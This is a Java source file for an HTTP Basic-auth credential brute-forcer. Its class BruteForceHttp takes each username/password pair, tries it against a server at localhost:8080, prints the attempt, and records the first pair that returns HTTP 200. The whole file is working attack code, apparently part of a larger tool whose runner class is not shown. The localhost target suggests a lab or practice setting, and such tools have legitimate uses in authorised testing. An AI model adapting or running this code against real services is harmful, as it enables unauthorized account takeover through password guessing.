package org.ops;

import org.apache.hc.client5.http.auth.AuthScope;
import org.apache.hc.client5.http.auth.UsernamePasswordCredentials;
import org.apache.hc.client5.http.classic.HttpClient;
import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.impl.auth.BasicCredentialsProvider;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.ClassicHttpResponse;
import org.apache.hc.core5.http.HttpStatus;

public class BruteForceHttp {

    private static final String TARGET_URL = "http://localhost:8080/";

    public static void tryCredential(Credential cred) {
        if (BruteForceRunner.isFound()) return;

        String user = cred.user;
        String pass = cred.password;

        System.out.printf("HTTP Trying %s:%s...%n", user, pass);

        var credsProvider = new BasicCredentialsProvider();
        credsProvider.setCredentials(
                new AuthScope("localhost", 8080),
                new UsernamePasswordCredentials(user, pass.toCharArray())
        );

        HttpClient client = HttpClients.custom()
                .setDefaultCredentialsProvider(credsProvider)
                .build();

        HttpGet request = new HttpGet(TARGET_URL);

        try (ClassicHttpResponse response = client.executeOpen(null, request, null)) {
            if (response.getCode() == HttpStatus.SC_OK) {
                BruteForceRunner.markFound();
                System.out.printf("FOUND → %s:%s%n", user, pass);
            } else {
                System.out.printf("Http Status: %d%n", response.getCode());
            }
        } catch (Exception e) {
            System.out.printf("Error: %s%n", e.getMessage());
        }
    }
}
